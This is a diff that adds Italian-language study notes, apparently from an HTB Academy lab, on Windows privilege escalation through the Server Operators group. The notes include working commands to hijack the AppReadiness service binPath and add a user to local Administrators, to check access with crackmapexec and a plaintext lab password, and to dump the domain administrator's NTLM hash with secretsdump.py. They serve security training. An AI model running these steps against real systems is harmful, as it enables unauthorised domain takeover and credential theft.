@@ -585,3 +585,35 @@ Ci sono pure tool per caricare il driver:(https://github.com/TarlogicSecurity/Eo
 
 ## Cleanup
 `C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom`
+
+
+# Server Operators Group
+
+Il gruppo di Server Operator permette di gestire i Windows server senza l'assegnazione esplicita dei privilegi da Domain Admins.
+
+E' un gruppo molto privilegiato che puo' loggare localmente sui server , inclusi i Domain Controllers.
+
+Essere di questo gruppo ci fornisce i privilegi **SeBackupPrivilege and SeRestorePrivilege** e l' abilita' di controllare i servizi locali.
+
+Dato che possiamo controllare i servizi locali. possiamo prendere un servizio di SYSTEM e modificarne il binPath e restartarlo.
+Facciamo con il servizio AppReadiness.
+
+`C:\htb> sc qc AppReadiness` Per verificare che SYSTEM e' l'owner
+
+`C:\htb> c:\Tools\PsService.exe security AppReadiness` controlliamo che effettivamente abbiamo tutti i permessi sui servizi locali
+
+`C:\htb> net localgroup Administrators` controlliamo che non siamo admin
+
+`C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"` modifichiamo il binPath e ci aggiungiamo ai local Administrators
+
+`C:\htb> sc start AppReadiness`. startiamo il servizio.
+
+`C:\htb> net localgroup Administrators` confermiamo che siamo local admin.
+
+## Confirming Local admin and Domain controller access
+Ora abbiamo controllo totale sul domain controller e possiamo prendere tutte le credenziali dal database NTDS.
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'`
+
+## Retrieving NTLM hashes from Domain Controllers
+`j4k1dibe@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`
+
